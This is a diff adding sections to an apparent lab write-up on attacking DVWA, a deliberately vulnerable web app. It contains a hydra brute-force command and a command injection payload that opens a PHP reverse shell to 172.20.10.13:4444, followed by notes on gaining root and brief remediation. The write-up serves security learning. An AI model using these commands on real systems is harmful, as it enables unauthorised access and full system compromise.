@@ -97,3 +97,41 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vu
 - Implement account lockout
 - Enforce strong passwords
 - Add rate limiting
+
+# Command Injection Exploitation - DVWA
+
+## Exploit Summary
+**Vulnerability**: OS Command Injection  
+**Target**: DVWA Command Execution Module  
+**Payload**: 
+```
+127.0.0.1; /usr/bin/php -r '$sock=fsockopen("172.20.10.13",4444);exec("sh <&3 >&3 2>&3");'
+```
+
+## Attack Flow
+
+### Step 1: Initial Command Injection
+<img width="700" height="487" alt="image" src="https://github.com/user-attachments/assets/14ccc83b-fc82-4561-ad5e-c9658c5591d9" />
+*Command injection via IP parameter with reverse shell payload*
+
+### Step 2: Reverse Shell Connection
+<img width="482" height="537" alt="image" src="https://github.com/user-attachments/assets/f5d973af-25fb-497e-b2a2-538e05f5ab12" />
+*Netcat listener receiving reverse shell connection*
+
+### Step 3: Privilege Escalation
+<img width="958" height="642" alt="image" src="https://github.com/user-attachments/assets/b2916b2c-d3c2-45ee-948f-5d3393e3ae7b" />
+*Gaining root access through privilege escalation*
+
+## Technical Details
+- **Injection Point**: IP address parameter
+- **Reverse Shell**: PHP backdoor to attacker IP `172.20.10.13:4444`
+- **Result**: Full system compromise with root access
+
+## Remediation
+- Input validation and sanitization
+- Use of parameterized commands
+- Principle of least privilege
+
+
+
+
